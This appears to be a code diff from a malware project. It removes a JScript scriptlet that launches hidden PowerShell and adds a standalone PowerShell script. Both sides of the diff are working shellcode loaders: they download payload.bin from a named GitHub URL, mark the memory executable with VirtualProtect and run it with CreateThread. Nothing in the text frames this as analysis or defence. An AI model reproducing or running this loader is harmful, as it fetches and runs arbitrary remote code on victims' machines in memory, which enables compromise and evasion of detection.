@@ -1,10 +1,14 @@
-<?XML version="1.0"?>
-<scriptlet>
-<registration progid="Run" classid="{00000000-0000-0000-0000-000000000001}">
-<script language="JScript">
-<![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"$wc=New-Object Net.WebClient;$sc=$wc.DownloadData('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/payload.bin');$va=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[Runtime.InteropServices.Marshal]::Copy($sc,0,$va,$sc.Length);$vp=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);' -Name K -Namespace W -PassThru;$o=0;[void]$vp::VirtualProtect($va,$sc.Length,0x40,[ref]$o);$ct=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref IntPtr t);' -Name T -Namespace W -PassThru;$t=0;[void]$ct::CreateThread(0,0,$va,0,0,[ref]$t);Start-Sleep 999\"", 0);
-]]>
-</script>
-</registration>
-</scriptlet>
+$wc = New-Object Net.WebClient;
+$sc = $wc.DownloadData('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/payload.bin');
+$va = [Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);
+[Runtime.InteropServices.Marshal]::Copy($sc, 0, $va, $sc.Length);
+
+$vp = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);' -Name Kernel32 -PassThru;
+$op = 0;
+$vp::VirtualProtect($va, $sc.Length, 0x40, [ref]$op) | Out-Null;
+
+$ct = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);' -Name Kernel32Thread -PassThru;
+$th = 0;
+$ct::CreateThread(0, 0, $va, 0, 0, [ref]$th) | Out-Null;
+
+Start-Sleep 999
